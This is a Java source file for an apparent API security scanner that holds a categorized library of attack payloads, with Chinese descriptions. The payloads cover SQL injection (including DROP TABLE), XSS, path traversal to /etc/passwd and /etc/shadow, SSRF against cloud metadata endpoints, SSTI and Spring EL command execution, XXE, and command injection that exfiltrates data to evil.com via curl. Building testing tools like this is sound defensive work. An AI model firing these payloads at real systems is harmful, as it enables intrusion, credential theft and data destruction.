package com.flechazo.apisentinel.detection;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * API 安全测试 Payload 库
 *
 * 提供 150+ 精心组织的 Payload，按攻击类型分类。
 * 每个 Payload 包含：payload 字符串、描述、预期触发条件。
 *
 * 参考：
 * - BurpAPISecuritySuite 108+ Payloads
 * - OWASP API Security Top 10
 * - PayloadsAllTheThings
 * - SecLists
 *
 * @since 1.2.0
 */
public final class PayloadLibrary {

    private static final Map<String, List<Payload>> PAYLOADS = new LinkedHashMap<>();

    static {
        // ==================== BOLA / IDOR ====================
        addPayloads(AttackType.BOLA, List.of(
                p("{{id}}+1", "ID 递增", "访问下一个资源"),
                p("{{id}}-1", "ID 递减", "访问上一个资源"),
                p("0", "ID 设为 0", "测试管理员/根资源"),
                p("1", "ID 设为 1", "测试首个资源"),
                p("-1", "ID 设为负数", "边界值测试"),
                p("999999999", "超大 ID", "资源枚举"),
                p("{{uuid}}", "替换为其他用户 UUID", "越权访问"),
                p("", "空 ID", "默认资源访问"),
                p("../{{other_user_id}}", "路径穿越 + ID", "组合攻击"),
                p("{{id}}/", "尾随斜杠", "访问控制绕过"),
                p("{{id}}.json", "添加扩展名", "路由匹配差异"),
                p("{{id}}%00", "空字节注入", "截断绕过"),
                p("[{{id}},{{other_id}}]", "批量 ID 数组", "批量越权"),
                p("{\"id\":{{other_id}}}", "JSON 包装", "参数污染")
        ));

        // ==================== SQL Injection ====================
        addPayloads(AttackType.SQL_INJECTION, List.of(
                // Error-based
                p("'", "单引号", "触发 SQL 语法错误"),
                p("\"", "双引号", "触发 SQL 语法错误"),
                p("' OR '1'='1", "OR 注入", "逻辑绕过"),
                p("' OR '1'='1' --", "OR + 注释", "逻辑绕过 + 截断"),
                p("' OR '1'='1' #", "OR + MySQL 注释", "MySQL 绕过"),
                p("1' ORDER BY 1--", "ORDER BY 探测列数", "联合注入准备"),
                p("1' UNION SELECT NULL--", "UNION NULL", "列数探测"),
                p("1' UNION SELECT NULL,NULL--", "UNION 2 列 NULL", "列数探测"),
                p("1' UNION SELECT 1,2,3--", "UNION 数字", "回显位置探测"),
                p("1' UNION SELECT @@version,2,3--", "UNION version", "MySQL 版本提取"),
                p("1' UNION SELECT table_name,2,3 FROM information_schema.tables--", "UNION 表名枚举", "MySQL 表提取"),
                // Boolean-based blind
                p("1' AND '1'='1", "AND True", "布尔盲注确认"),
                p("1' AND '1'='2", "AND False", "布尔盲注差异"),
                p("1' AND SUBSTRING(@@version,1,1)='5", "SUBSTRING 版本", "MySQL 版本逐字符"),
                // Time-based blind
                p("1' AND SLEEP(5)--", "SLEEP 5秒", "MySQL 时间盲注"),
                p("1'; WAITFOR DELAY '0:0:5'--", "WAITFOR", "SQL Server 时间盲注"),
                p("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "子查询 SLEEP", "绕过过滤"),
                // Stacked queries
                p("1'; DROP TABLE test--", "堆叠 DROP", "堆叠注入测试"),
                p("1'; INSERT INTO users VALUES('hacker','pass')--", "堆叠 INSERT", "堆叠写入"),
                // PostgreSQL specific
                p("1' UNION SELECT version()--", "PG version", "PostgreSQL 版本"),
                p("1'; SELECT pg_sleep(5)--", "pg_sleep", "PostgreSQL 时间盲注"),
                // Oracle specific
                p("1' UNION SELECT banner FROM v$version--", "Oracle banner", "Oracle 版本"),
                // NoSQL
                p("{\"$ne\":\"\"}", "MongoDB $ne", "NoSQL 认证绕过"),
                p("{\"$gt\":\"\"}", "MongoDB $gt", "NoSQL 大于绕过")
        ));

        // ==================== XSS ====================
        addPayloads(AttackType.XSS, List.of(
                p("<script>alert(1)</script>", "基础 script 标签", "反射型 XSS"),
                p("<img src=x onerror=alert(1)>", "img onerror", "图片错误事件"),
                p("<svg/onload=alert(1)>", "SVG onload", "SVG 事件"),
                p("\"><script>alert(1)</script>", "闭合属性 + script", "属性注入"),
                p("'-alert(1)-'", "JS 上下文注入", "JavaScript 字符串"),
                p("<img src=x onerror=\"alert(document.cookie)\">", "Cookie 窃取", "会话劫持"),
                p("javascript:alert(1)", "JS 协议", "URL 注入"),
                p("<iframe src=\"javascript:alert(1)\">", "iframe JS", "框架注入"),
                p("<details open ontoggle=alert(1)>", "details ontoggle", "HTML5 事件"),
                p("<body/onpageshow=alert(1)>", "pageshow 事件", "页面事件"),
                p("<marquee onstart=alert(1)>", "marquee onstart", "旧标签事件"),
                p("{{7*7}}", "模板表达式", "SSTI/XSS 探测"),
                p("${7*7}", "EL 表达式", "表达式语言注入")
        ));

        // ==================== Path Traversal ====================
        addPayloads(AttackType.PATH_TRAVERSAL, List.of(
                p("../../etc/passwd", "Unix 基础穿越", "读取 /etc/passwd"),
                p("..%2f..%2fetc%2fpasswd", "URL 编码穿越", "绕过 WAF"),
                p("....//....//etc/passwd", "双 ../ 绕过", "过滤绕过"),
                p("..\\..\\windows\\win.ini", "Windows 穿越", "Windows 系统文件"),
                p("../../../proc/self/environ", "Linux 环境变量", "敏感信息泄露"),
                p("....//....//....//etc/shadow", "shadow 文件", "密码哈希提取"),
                p("%2e%2e/%2e%2e/etc/passwd", "双 URL 编码", "绕过解码"),
                p("..%252f..%252fetc%252fpasswd", "二次编码", "双重 URL 编码绕过"),
                p("/etc/passwd", "绝对路径", "直接路径访问"),
                p("file:///etc/passwd", "file:// 协议", "文件协议读取"),
                p("../../../etc/hosts", "hosts 文件", "网络信息"),
                p("../../../var/log/apache2/access.log", "日志文件", "日志信息泄露")
        ));

        // ==================== SSRF ====================
        addPayloads(AttackType.SSRF, List.of(
                p("http://127.0.0.1", "本地回环", "内网访问"),
                p("http://localhost", "localhost", "本地服务"),
                p("http://[::1]", "IPv6 回环", "IPv6 内网"),
                p("http://169.254.169.254/latest/meta-data/", "AWS 元数据", "AWS IAM 凭据"),
                p("http://169.254.169.254/metadata/v1/", "DigitalOcean 元数据", "DO 凭据"),
                p("http://metadata.google.internal/computeMetadata/v1/", "GCP 元数据", "GCP 凭据"),
                p("http://100.100.100.200/latest/meta-data/", "阿里云元数据", "阿里云凭据"),
                p("http://10.0.0.1", "内网 A 段", "内网扫描"),
                p("http://172.16.0.1", "内网 B 段", "内网扫描"),
                p("http://192.168.1.1", "内网 C 段", "内网扫描"),
                p("dict://127.0.0.1:6379/info", "Redis SSRF", "Redis 信息"),
                p("gopher://127.0.0.1:3306/_", "MySQL Gopher", "数据库访问"),
                p("file:///etc/passwd", "file:// 协议", "文件读取"),
                p("http://0.0.0.0", "0.0.0.0", "全接口访问"),
                p("http://127.1", "127.1 简写", "回环简写绕过"),
                p("http://2130706433", "十进制 IP", "IP 格式绕过"),
                p("http://0x7f000001", "十六进制 IP", "IP 格式绕过"),
                p("http://127.0.0.1:80%0d%0aHost: evil.com", "CRLF 注入", "头部注入")
        ));

        // ==================== SSTI ====================
        addPayloads(AttackType.SSTI, List.of(
                p("{{7*7}}", "Jinja2/Twig 基础", "模板引擎探测"),
                p("{{7*'7'}}", "Jinja2 类型检测", "Python/PHP 区分"),
                p("${7*7}", "Freemarker/Thymeleaf", "Java 模板探测"),
                p("#{7*7}", "Ruby ERB/EL", "Ruby/EL 探测"),
                p("<%= 7*7 %>", "ERB 基础", "Ruby ERB"),
                p("{{config}}", "Jinja2 config", "Flask 配置泄露"),
                p("{{''.__class__.__mro__[2].__subclasses__()}}", "Jinja2 RCE", "Python 类链"),
                p("${T(java.lang.Runtime).getRuntime().exec('id')}", "Spring RCE", "Spring EL 命令执行"),
                p("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "Twig RCE", "Twig 函数注册"),
                p("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "Jinja2 链", "Python 命令执行")
        ));

        // ==================== XXE ====================
        addPayloads(AttackType.XXE, List.of(
                p("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", "基础 XXE", "文件读取"),
                p("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]><root>&xxe;</root>", "外部实体 SSRF", "外部请求"),
                p("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><root/>", "参数实体", "外部 DTD"),
                p("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>", "PHP filter", "Base64 编码读取"),
                p("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:http://evil.com/xxe.jar!/xxe\">]><root>&xxe;</root>", "Java JAR", "Java 资源读取")
        ));

        // ==================== Command Injection ====================
        addPayloads(AttackType.INJECTION, List.of(
                p("; id", "分号 + 命令", "Unix 命令链接"),
                p("| id", "管道 + 命令", "管道注入"),
                p("$(id)", "命令替换", "子命令执行"),
                p("`id`", "反引号命令", "子命令执行"),
                p("&& id", "AND 链接", "条件执行"),
                p("|| id", "OR 链接", "条件执行"),
                p("\nid", "换行注入", "多行执行"),
                p("; sleep 5", "时间延迟", "盲注确认"),
                p("| curl http://evil.com/$(whoami)", "OOB 外带", "数据外传"),
                p("; cat /etc/passwd", "文件读取", "敏感文件"),
                p("$(curl http://evil.com/?x=$(id))", "嵌套命令", "OOB 数据外传")
        ));

        // ==================== Broken Authentication ====================
        addPayloads(AttackType.BROKEN_AUTH, List.of(
                p("{\"username\":\"admin\",\"password\":\"admin\"}", "默认凭据 admin", "弱密码"),
                p("{\"username\":\"admin\",\"password\":\"password\"}", "默认凭据 password", "弱密码"),
                p("{\"username\":\"admin\",\"password\":\"123456\"}", "默认凭据 123456", "弱密码"),
                p("{\"username\":\"admin\",\"password\":\"admin123\"}", "默认凭据 admin123", "弱密码"),
                p("{\"username\":\"admin\",\"password\":\"\"}", "空密码", "空密码绕过"),
                p("{\"username\":\"admin'--\",\"password\":\"anything\"}", "SQL 注入绕过", "认证绕过"),
                p("{\"username\":\"admin\\\"--\",\"password\":\"anything\"}", "SQL 注入绕过（双引号）", "认证绕过"),
                p("{\"username\":\" admin \",\"password\":\"correct\"}", "用户名空格填充", "空格修剪绕过"),
                p("{\"username\":\"Admin\",\"password\":\"correct\"}", "大小写变化", "大小写不敏感"),
                p("{\"username\":\"ADMIN\",\"password\":\"correct\"}", "全大写", "大小写不敏感")
        ));

        // ==================== Mass Assignment ====================
        addPayloads(AttackType.MASS_ASSIGNMENT, List.of(
                p("{\"isAdmin\":true}", "管理员标志", "权限提升"),
                p("{\"role\":\"admin\"}", "角色提升", "角色篡改"),
                p("{\"balance\":999999}", "余额篡改", "金额篡改"),
                p("{\"verified\":true}", "验证绕过", "邮箱验证绕过"),
                p("{\"status\":\"active\"}", "状态篡改", "账户激活"),
                p("{\"price\":0}", "价格篡改", "免费购买"),
                p("{\"discount\":100}", "折扣篡改", "全额折扣"),
                p("{\"userId\":1}", "用户 ID 篡改", "越权操作"),
                p("{\"createdAt\":\"2020-01-01\"}", "时间篡改", "创建时间伪造"),
                p("{\"deleted\":false}", "恢复删除", "软删除恢复")
        ));

        // ==================== Security Misconfiguration ====================
        addPayloads(AttackType.SECURITY_MISCONFIG, List.of(
                p("/.env", "环境变量文件", "配置泄露"),
                p("/.git/config", "Git 配置", "代码仓库"),
                p("/.git/HEAD", "Git HEAD", "分支信息"),
                p("/wp-config.php", "WordPress 配置", "数据库凭据"),
                p("/config.php", "PHP 配置", "应用配置"),
                p("/application.yml", "Spring 配置", "Spring Boot 配置"),
                p("/actuator/env", "Spring Actuator", "环境变量泄露"),
                p("/actuator/health", "Spring Health", "健康检查"),
                p("/actuator/info", "Spring Info", "应用信息"),
                p("/swagger-ui.html", "Swagger UI", "API 文档"),
                p("/api-docs", "API 文档", "API 文档泄露"),
                p("/graphql", "GraphQL 端点", "GraphQL 探测"),
                p("/debug", "调试端点", "调试信息"),
                p("/trace", "Trace 端点", "请求追踪"),
                p("/server-info", "服务器信息", "Apache 信息"),
                p("/server-status", "服务器状态", "Apache 状态"),
                p("/.DS_Store", "macOS 元数据", "目录结构泄露"),
                p("/web.config", "IIS 配置", "IIS 配置泄露"),
                p("/robots.txt", "爬虫规则", "隐藏路径泄露"),
                p("/sitemap.xml", "站点地图", "URL 结构泄露")
        ));

        // ==================== CSRF ====================
        addPayloads(AttackType.CSRF, List.of(
                p("POST without CSRF token", "无 Token 请求", "CSRF 防护缺失"),
                p("CSRF token as empty string", "空 Token", "Token 验证绕过"),
                p("CSRF token from another session", "跨会话 Token", "Token 绑定验证"),
                p("CSRF token copied from GET response", "GET Token 复用", "Token 重用攻击")
        ));

        // ==================== Open Redirect ====================
        addPayloads(AttackType.OPEN_REDIRECT, List.of(
                p("https://evil.com", "外部 URL", "直接重定向"),
                p("//evil.com", "协议相对 URL", "协议相对重定向"),
                p("/\\evil.com", "反斜杠绕过", "路径绕过"),
                p("https://legitimate.com@evil.com", "URL 认证绕过", "用户信息混淆"),
                p("https://evil.com?legitimate.com", "参数伪装", "URL 参数混淆"),
                p("/redirect?url=https://evil.com", "参数注入", "参数控制")
        ));

        // ==================== GraphQL ====================
        addPayloads(AttackType.GRAPHQL, List.of(
                p("{\"query\":\"{ __schema { types { name } } }\"}", "Introspection", "Schema 枚举"),
                p("{\"query\":\"{ __type(name: \\\"User\\\") { fields { name type { name } } } }\"}", "类型枚举", "字段枚举"),
                p("{\"query\":\"{ user(id: 1) { ...on User { id name email password } } }\"}", "敏感字段", "数据提取"),
                p("{\"query\":\"{ user(id: 2) { id name } }\"}", "ID 枚举", "BOLA 测试"),
                p("{\"query\":\"query { \" + \"a\".repeat(5000) + \" }\"}", "超长查询", "DoS 测试"),
                p("{\"query\":\"{ a { b { c { d { e { f { g } } } } } } }\"}", "深度嵌套", "复杂度 DoS")
        ));

        // ==================== Resource Consumption ====================
        addPayloads(AttackType.RESOURCE_CONSUMPTION, List.of(
                p("{\"limit\":999999}", "超大 limit", "分页滥用"),
                p("{\"items\":" + "[1]".repeat(100) + "}", "大数组", "批量处理滥用"),
                p("A".repeat(10000), "超长字符串", "内存耗尽"),
                p("{\"depth\":" + "{\"a\":".repeat(100) + "\"value\"" + "}".repeat(100) + "}", "深层嵌套", "解析器 DoS"),
                p("并发 100 请求", "并发请求", "速率限制探测"),
                p("大文件上传 100MB", "大文件", "存储滥用")
        ));

        // ==================== Broken Function Level Authorization ====================
        addPayloads(AttackType.BROKEN_FUNCTION_AUTH, List.of(
                p("GET /api/admin/users", "管理员端点", "管理员访问"),
                p("GET /api/v1/admin/config", "管理配置", "配置泄露"),
                p("DELETE /api/users/1", "删除用户", "权限提升"),
                p("PUT /api/roles", "角色管理", "角色篡改"),
                p("POST /api/admin/backup", "管理备份", "管理功能"),
                p("GET /api/internal/debug", "内部端点", "内部接口暴露"),
                p("POST /api/admin/reset-password", "重置密码", "管理功能滥用")
        ));

        // ==================== Deserialization ====================
        addPayloads(AttackType.DESERIALIZATION, List.of(
                p("aced0005...", "Java 序列化魔术字节", "Java 反序列化"),
                p("{\"@type\":\"java.lang.AutoCloseable\"}", "Fastjson @type", "Fastjson RCE"),
                p("O:8:\"stdClass\":0:{}", "PHP 序列化", "PHP 对象注入"),
                p("gASV...", "Python pickle", "Python 反序列化"),
                p("<java version=\"1.8\">", "Java XMLDecoder", "XML 反序列化")
        ));

        // ==================== WAF Bypass ====================
        addPayloads(AttackType.WAF_BYPASS, List.of(
                p("UnIoN SeLeCt", "大小写混合", "关键字绕过"),
                p("UNI%4fN SEL%45CT", "URL 编码", "编码绕过"),
                p("UNION/**/SELECT", "注释替换空格", "注释绕过"),
                p("UNION%0aSELECT", "换行符", "空白字符绕过"),
                p("UNION%09SELECT", "Tab 符", "Tab 绕过"),
                p("/*!UNION*/ /*!SELECT*/", "MySQL 条件注释", "MySQL 特殊绕过"),
                p("UNION ALL SELECT", "ALL 关键字", "变体绕过"),
                p("%55NION SELECT", "Unicode 编码", "Unicode 绕过")
        ));

        // ==================== Business Logic ====================
        addPayloads(AttackType.BUSINESS_LOGIC, List.of(
                p("{\"quantity\":-1}", "负数数量", "金额逆转"),
                p("{\"price\":0.01}", "价格篡改", "低价购买"),
                p("{\"coupon\":\"DISCOUNT100\"}", "优惠券叠加", "折扣叠加"),
                p("并发下单（竞态条件）", "竞态条件", "库存/余额竞争"),
                p("{\"step\":3} 跳过步骤2", "流程跳过", "业务步骤绕过"),
                p("{\"amount\":\"-100\"}", "负数金额字符串", "类型混淆"),
                p("重复提交订单", "重放攻击", "重复消费"),
                p("{\"currency\":\"USD\",\"amount\":1} → {\"currency\":\"JPY\",\"amount\":1}", "货币切换", "汇率差异利用")
        ));
    }

    // ==================== Helper Methods ====================

    private static Payload p(String value, String name, String description) {
        return new Payload(value, name, description);
    }

    private static void addPayloads(String attackType, List<Payload> payloads) {
        PAYLOADS.put(attackType, Collections.unmodifiableList(new ArrayList<>(payloads)));
    }

    /**
     * 获取指定攻击类型的所有 Payload
     */
    public static List<Payload> get(String attackType) {
        return PAYLOADS.getOrDefault(attackType, Collections.emptyList());
    }

    /**
     * 获取所有 Payload（平铺）
     */
    public static List<Payload> getAll() {
        return PAYLOADS.values().stream()
                .flatMap(List::stream)
                .toList();
    }

    /**
     * 获取所有已注册的攻击类型 ID
     */
    public static List<String> getAttackTypes() {
        return List.copyOf(PAYLOADS.keySet());
    }

    /**
     * 获取 Payload 总数
     */
    public static int totalCount() {
        return PAYLOADS.values().stream().mapToInt(List::size).sum();
    }

    /**
     * 根据关键字搜索 Payload
     */
    public static List<Payload> search(String keyword) {
        String lower = keyword.toLowerCase();
        return PAYLOADS.values().stream()
                .flatMap(List::stream)
                .filter(p -> p.value().toLowerCase().contains(lower)
                        || p.name().toLowerCase().contains(lower)
                        || p.description().toLowerCase().contains(lower))
                .toList();
    }

    /**
     * 获取统计信息
     */
    public static Map<String, Integer> getStats() {
        Map<String, Integer> stats = new LinkedHashMap<>();
        PAYLOADS.forEach((type, list) -> stats.put(type, list.size()));
        stats.put("TOTAL", totalCount());
        return stats;
    }

    /**
     * 替换 Payload 中的模板变量
     *
     * @param payload 原始 Payload
     * @param params  参数映射（如 "id" → "123"）
     * @return 替换后的 Payload
     */
    public static String render(String payload, Map<String, String> params) {
        if (payload == null || params == null) return payload;
        String result = payload;
        for (var entry : params.entrySet()) {
            result = result.replace("{{" + entry.getKey() + "}}", entry.getValue());
        }
        return result;
    }

    /**
     * 单条 Payload 记录
     *
     * @param value       Payload 字符串
     * @param name        简短名称
     * @param description 描述/预期效果
     */
    public record Payload(
            String value,
            String name,
            String description
    ) {}
}
